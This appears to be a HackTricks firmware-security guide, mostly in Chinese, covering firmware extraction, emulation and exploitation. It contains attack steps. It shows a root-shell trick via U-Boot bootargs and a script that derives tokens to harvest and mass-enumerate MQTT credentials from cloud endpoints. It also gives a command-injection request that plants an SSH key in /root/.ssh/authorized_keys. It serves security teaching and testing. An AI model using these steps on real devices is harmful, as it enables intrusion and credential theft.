# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Introduction**

### Related resources


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

固件是使设备能够正确运行的关键软件，负责管理并促进硬件组件与用户交互的软件之间的通信。它存储在永久性存储器中，确保设备从上电那一刻起就能访问重要指令，从而引导操作系统的启动。检查并可能修改固件是识别安全漏洞的关键步骤。

## **Gathering Information**

**收集信息**是理解设备组成和所用技术的关键第一步。此过程包括收集以下方面的数据：

- 设备运行的 CPU 架构和操作系统
- Bootloader 具体信息
- 硬件布局和 datasheets
- 代码库指标和源代码位置
- 外部库和许可类型
- 更新历史和合规认证
- 架构和流程图
- 安全评估和已识别的漏洞

为此，开源情报 (OSINT) 工具非常有价值，同时还需通过手动和自动化审查流程分析任何可用的开源软件组件。像 [Coverity Scan](https://scan.coverity.com) 和 [Semmle’s LGTM](https://lgtm.com/#explore) 这样的工具提供免费的静态分析，可用于发现潜在问题。

## **Acquiring the Firmware**

获取固件可以通过多种方式，每种方式具有不同的难度级别：

- **直接** 从来源（开发者、制造商）
- **构建** 根据提供的说明
- **从官方支持站点下载**
- 使用 **Google dork** 查询查找托管的固件文件
- 直接访问 **云存储**，使用像 [S3Scanner](https://github.com/sa7mon/S3Scanner) 这样的工具
- 通过中间人技术拦截 **updates**
- 通过 **UART**, **JTAG** 或 **PICit** 等连接从设备中**提取**
- 在设备通信中嗅探更新请求
- 识别并使用 **硬编码的更新端点**
- 从 bootloader 或网络中 **dump**
- 当其他方法都失败时，移除并读取存储芯片，使用适当的硬件工具

### UART-only logs: force a root shell via U-Boot env in flash

如果 UART RX 被忽略（仅有日志），你仍然可以通过离线**编辑 U-Boot environment blob**来强制获得 init shell：

1. 使用 SOIC-8 夹具 + programmer（3.3V）dump SPI flash：
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. 找到 U-Boot env 分区，编辑 `bootargs` 以包含 `init=/bin/sh`，并为该 blob **重新计算 U-Boot env CRC32**。
3. 只重新写入 env 分区并重启；UART 上应该会出现一个 shell。

这在 bootloader shell 被禁用但通过外部 flash 访问可写入 env 分区的嵌入式设备上非常有用。

## Analyzing the firmware

现在你已经有了固件，需要从中提取相关信息以决定如何处理。可以使用的不同工具有：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
如果用这些工具没有发现太多内容，请用 `binwalk -E <bin>` 检查镜像的**熵**，如果熵低，则很可能未被加密；如果熵高，则很可能被加密（或以某种方式被压缩）。

此外，你可以使用这些工具来提取**固件中嵌入的文件**：

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

或者使用 [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) 来检查该文件。

### 获取文件系统

使用之前提到的工具（例如 `binwalk -ev <bin>`）你应该已经能够**提取文件系统**。\
Binwalk 通常会将其提取到一个**以文件系统类型命名的文件夹**中，通常为以下之一：squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### 手动提取文件系统

有时，binwalk 在其签名中**不会包含文件系统的 magic byte**。在这种情况下，使用 binwalk **查找文件系统的偏移并从二进制中切割出压缩的文件系统**，然后根据其类型**手动提取**文件系统，按以下步骤操作。
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
运行以下 **dd command** 来提取 Squashfs 文件系统。
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
另外，也可以运行以下命令。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- 对于 squashfs（在上例中使用）

`$ unsquashfs dir.squashfs`

文件随后会位于 `squashfs-root` 目录中。

- 对于 CPIO 归档文件

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- 对于 jffs2 文件系统

`$ jefferson rootfsfile.jffs2`

- 对于带有 NAND flash 的 ubifs 文件系统

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## 分析固件

一旦获得固件，就必须对其进行剖析，以了解其结构和潜在的漏洞。此过程需要使用各种工具来分析并从固件镜像中提取有价值的数据。

### 初始分析工具

下面提供了一组用于对二进制文件（下文称为 `<bin>`）进行初步检查的命令。这些命令有助于识别文件类型、提取字符串、分析二进制数据，并了解分区和文件系统的详细信息：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
要评估镜像的加密状态，使用 `binwalk -E <bin>` 检查 **熵**。低熵表示可能未加密，高熵则表明可能已加密或被压缩。

要提取 **嵌入式文件**，建议使用像 **file-data-carving-recovery-tools** 文档和用于文件检查的 **binvis.io** 之类的工具和资源。

### 提取文件系统

使用 `binwalk -ev <bin>`，通常可以提取文件系统，提取结果通常放在以文件系统类型命名的目录中（例如 squashfs、ubifs）。然而，当 **binwalk** 因为缺失 magic bytes 无法识别文件系统类型时，就必须手动提取。流程是先用 `binwalk` 定位文件系统的偏移量，然后用 `dd` 命令提取文件系统：
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
随后，根据 filesystem 类型（例如 squashfs、cpio、jffs2、ubifs），会使用不同的命令手动提取内容。

### 文件系统分析

在提取出文件系统后，开始搜索安全缺陷。重点关注不安全的网络守护进程、硬编码凭证、API 端点、更新服务器功能、未编译的代码、启动脚本以及用于离线分析的已编译二进制文件。

**关键位置** 和 **检查项** 包括：

- **etc/shadow** 和 **etc/passwd** 用于用户凭证
- 位于 **etc/ssl** 的 SSL 证书和密钥
- 可能存在漏洞的配置和脚本文件
- 用于进一步分析的嵌入式二进制文件
- 常见的 IoT 设备 web 服务器和二进制文件

若干工具可帮助在文件系统内发现敏感信息和漏洞：

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 和 [**Firmwalker**](https://github.com/craigz28/firmwalker) 用于搜索敏感信息
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) 用于全面的固件分析
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) 和 [**EMBA**](https://github.com/e-m-b-a/emba) 用于静态和动态分析

### 已编译二进制的安全检查

必须对文件系统中发现的源代码和已编译二进制进行仔细审查以查找漏洞。像 **checksec.sh**（用于 Unix 二进制）和 **PESecurity**（用于 Windows 二进制）这样的工具可帮助识别可能被利用的未保护二进制。

## 通过派生的 URL 令牌获取云配置和 MQTT 凭证

许多 IoT 集线器从如下形式的云端点为每个设备获取配置：

- `https://<api-host>/pf/<deviceId>/<token>`

在固件分析过程中，你可能会发现 `<token>` 在本地由 device ID 通过硬编码的密钥派生，例如：

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

这种设计使得任何得知 deviceId 和 STATIC_KEY 的人都可以重构 URL 并拉取云配置，通常会暴露明文 MQTT 凭证和主题前缀。

实用工作流程：

1) 从 UART 启动日志中提取 deviceId

- 使用 3.3V UART 适配器（TX/RX/GND）连接并捕获日志：
```bash
picocom -b 115200 /dev/ttyUSB0
```
- 查找打印 cloud config URL pattern 和 broker address 的行，例如：
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) 从固件中恢复 STATIC_KEY 和 token 算法

- 将二进制加载到 Ghidra/radare2 中，搜索配置路径 ("/pf/") 或 MD5 的使用。
- 确认算法（例如 MD5(deviceId||STATIC_KEY)）。
- 在 Bash 中推导 token，并将摘要转换为大写：
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) 收集 cloud config 和 MQTT credentials

- 使用 curl 组合 URL 并拉取 JSON；用 jq 解析以提取机密：
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) 滥用 plaintext MQTT 和弱 topic ACLs（如果存在）

- 使用恢复的凭证订阅维护主题并查找敏感事件：
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 枚举可预测的设备 ID（在大规模、有授权的情况下）

- 许多生态系统会嵌入供应商 OUI/product/type 字节，后面跟着顺序后缀。
- 你可以遍历候选 ID、推导 tokens 并以编程方式获取配置：
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
注意事项
- 在尝试 mass enumeration 之前，始终获得明确授权。
- 尽可能优先使用 emulation 或 static analysis 来 recover secrets，避免修改 target hardware。

The process of emulating firmware enables **dynamic analysis** either of a device's operation or an individual program. This approach can encounter challenges with hardware or architecture dependencies, but transferring the root filesystem or specific binaries to a device with matching architecture and endianness, such as a Raspberry Pi, or to a pre-built virtual machine, can facilitate further testing.

### Emulating Individual Binaries

For examining single programs, identifying the program's endianness and CPU architecture is crucial.

#### Example with MIPS Architecture

To emulate a MIPS architecture binary, one can use the command:
```bash
file ./squashfs-root/bin/busybox
```
并安装所需的仿真工具：
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### ARM 架构仿真

For ARM binaries, the process is similar, with the `qemu-arm` emulator being utilized for emulation.

### 全系统仿真

Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, facilitate full firmware emulation, automating the process and aiding in dynamic analysis.

## 动态分析实践

在此阶段，分析会在真实设备或仿真设备环境中进行。必须保持对 OS 的 shell 访问以及对 filesystem 的访问。仿真可能无法完美再现硬件交互，因而可能需要偶尔重启仿真环境。分析应反复检查 filesystem，利用暴露的 webpages 和 network services，并挖掘 bootloader 漏洞。固件完整性测试对于识别潜在 backdoor 漏洞至关重要。

## 运行时分析技术

运行时分析涉及在目标的运行环境中与 process 或 binary 交互，使用诸如 gdb-multiarch、Frida 和 Ghidra 等工具设置断点，并通过 fuzzing 等技术识别漏洞。

对于没有完整 debugger 的嵌入式目标，**复制一个静态链接的 `gdbserver` 到设备并远程 attach：**
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
## Binary Exploitation and Proof-of-Concept

为已识别的漏洞开发 PoC 需要深入理解目标架构并使用底层语言编程。嵌入式系统中的二进制运行时保护较少，但如果存在，可能需要像 Return Oriented Programming (ROP) 这样的技术。

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc 使用类似于 glibc 的 fastbins。后续的大规模分配可能触发 `__malloc_consolidate()`，因此任何伪造的 chunk 必须通过检查（合理的 size、`fd = 0`，以及周围的 chunks 被视为“in use”）。
- **Non-PIE binaries under ASLR:** 如果启用了 ASLR 但主二进制是 **non-PIE**，二进制内的 `.data/.bss` 地址是稳定的。你可以针对一个已经类似于有效 heap chunk header 的区域，以将 fastbin 分配落到 **function pointer table** 上。
- **Parser-stopping NUL:** 当解析 JSON 时，负载中的 `\x00` 可以停止解析，同时保留后续由攻击者控制的字节用于 stack pivot/ROP 链。
- **Shellcode via `/proc/self/mem`:** 一个调用 `open("/proc/self/mem")`、`lseek()` 和 `write()` 的 ROP 链可以在已知映射中植入可执行的 Shellcode 并跳转到它。

## Prepared Operating Systems for Firmware Analysis

像 [AttifyOS](https://github.com/adi0x90/attifyos) 和 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 这样的操作系统提供了预配置的固件安全测试环境，包含所需工具。

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS 是一个用于对 Internet of Things (IoT) 设备进行安全评估和 penetration testing 的发行版。它通过提供一个预配置并预装所有必要工具的环境，为你节省大量时间。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): 基于 Ubuntu 18.04 的嵌入式安全测试操作系统，预装了固件安全测试工具。

## Firmware Downgrade Attacks & Insecure Update Mechanisms

即使厂商对固件镜像实现了 cryptographic signature checks，**version rollback (downgrade) protection is frequently omitted**。当 boot- 或 recovery-loader 仅使用嵌入的公钥验证签名，但不对被刷写镜像的 *version*（或单调计数器）进行比较时，攻击者可以合法地安装一个仍带有有效签名的 **较旧、存在漏洞的固件**，从而重新引入已修补的漏洞。

典型攻击流程：

1. **Obtain an older signed image**
   * 从厂商的公共下载门户、CDN 或支持网站获取。
   * 从配套的移动/桌面应用中提取（例如在 Android APK 的 `assets/firmware/` 下）。
   * 从第三方仓库检索，如 VirusTotal、互联网存档、论坛等。
2. **Upload or serve the image to the device** 通过任何暴露的更新通道：
   * Web UI、mobile-app API、USB、TFTP、MQTT 等。
   * 许多消费级 IoT 设备暴露 *unauthenticated* 的 HTTP(S) 端点，接受 Base64 编码的固件 blob，在服务器端解码并触发恢复/升级。
3. 降级后，利用在较新版本中已修补的漏洞（例如后来添加的命令注入过滤器）。
4. 可选地再刷回最新镜像或禁用更新，以在获得持久性后避免被检测。

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
在易受攻击（被降级）的固件中，`md5` 参数被直接拼接到 shell command 中且未经过任何 sanitisation，从而允许注入任意命令（此处用于启用基于 SSH 密钥的 root 访问）。后续固件版本引入了一个基本字符过滤，但由于缺乏降级保护，该修复形同虚设。

### 从移动应用提取固件

许多厂商会把完整固件镜像打包到其配套移动应用中，以便应用通过 Bluetooth/Wi-Fi 更新设备。这些包通常以未加密形式存放在 APK/APEX 的诸如 `assets/fw/` 或 `res/raw/` 路径下。像 `apktool`、`ghidra`，甚至直接用 `unzip` 都可以在不触碰物理硬件的情况下提取签名的镜像。
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### 评估更新逻辑的检查清单

* 更新端点 *update endpoint* 的传输/认证是否得到充分保护（TLS + authentication）？
* 设备在刷写之前是否会比较 **version numbers** 或 **monotonic anti-rollback counter**？
* 镜像是否在 secure boot chain 内被验证（e.g. signatures checked by ROM code）？
* userland code 是否执行额外的合理性检查（e.g. allowed partition map, model number）？
* *partial* 或 *backup* 更新流程是否重用相同的验证逻辑？

> 💡  如果上述任何一项缺失，平台很可能容易受到 rollback attacks。

## 用于练习的易受攻击固件

要练习在固件中发现漏洞，可将以下易受攻击的固件项目作为起点。

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 培训与证书

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## 参考资料

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)

{{#include ../../banners/hacktricks-training.md}}
